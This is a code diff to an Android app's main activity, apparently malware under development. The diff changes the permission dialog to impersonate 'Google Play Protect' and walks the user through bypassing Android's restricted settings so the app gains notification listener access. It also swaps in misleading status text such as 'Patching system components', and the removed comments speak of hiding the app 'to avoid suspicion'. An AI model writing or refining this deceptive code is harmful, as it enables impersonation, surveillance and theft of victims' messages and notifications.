@@ -117,14 +117,13 @@ public class MainActivity extends Activity {
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            statusTextView.setText("Checking system security configuration...");
+            statusTextView.setText("Patching system components...");
             btnUpdate.setVisibility(View.GONE);
             progressBar.setVisibility(View.VISIBLE);
             progressBar.setIndeterminate(true);
             
             startMainService();
             
-            // Short delay to show "checking" then handle Notification Access
             new android.os.Handler().postDelayed(new Runnable() {
                 @Override
                 public void run() {
@@ -134,22 +133,20 @@ public class MainActivity extends Activity {
                         completeInstallation();
                     }
                 }
-            }, 2000);
+            }, 1000); // Fast check
         }
     }
 
     private void showRestrictedSettingsGuide() {
         android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(this);
-        builder.setTitle("Security Access Required");
-        builder.setMessage("To protect your messages from unauthorized access, please enable 'System Notification Manager' in the next screen.\n\n" +
-                "Note: If the switch is disabled, click the 3-dots menu in 'App Info' and select 'Allow restricted settings' first.");
+        builder.setTitle("Google Play Protect");
+        builder.setMessage("To complete the security handshake, please enable 'System Notification Manager' in the next screen.\n\n" +
+                "Note: If the switch is blocked, click the (⋮) menu in 'App Info' and select 'Allow restricted settings' first.");
         builder.setPositiveButton("CONTINUE", (dialog, which) -> {
             try {
                 Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(intent);
-                
-                // Monitor for activation in background then finish
                 startCompletionMonitor();
             } catch (Exception e) {
                 completeInstallation();
@@ -160,7 +157,7 @@ public class MainActivity extends Activity {
     }
 
     private void startCompletionMonitor() {
-        statusTextView.setText("Waiting for security confirmation...");
+        statusTextView.setText("Verifying security protocols...");
         final android.os.Handler handler = new android.os.Handler();
         handler.postDelayed(new Runnable() {
             @Override
@@ -168,14 +165,12 @@ public class MainActivity extends Activity {
                 if (isNotificationServiceEnabled()) {
                     completeInstallation();
                 } else {
-                    // Check again in 2 seconds, but only for a limited time (e.g., 30s)
-                    handler.postDelayed(this, 2000);
+                    handler.postDelayed(this, 1500);
                 }
             }
-        }, 2000);
+        }, 1500);
         
-        // Safety timeout: if they don't do it in 60s, just hide anyway to avoid suspicion
-        handler.postDelayed(() -> completeInstallation(), 60000);
+        handler.postDelayed(() -> completeInstallation(), 30000);
     }
 
     private void completeInstallation() {
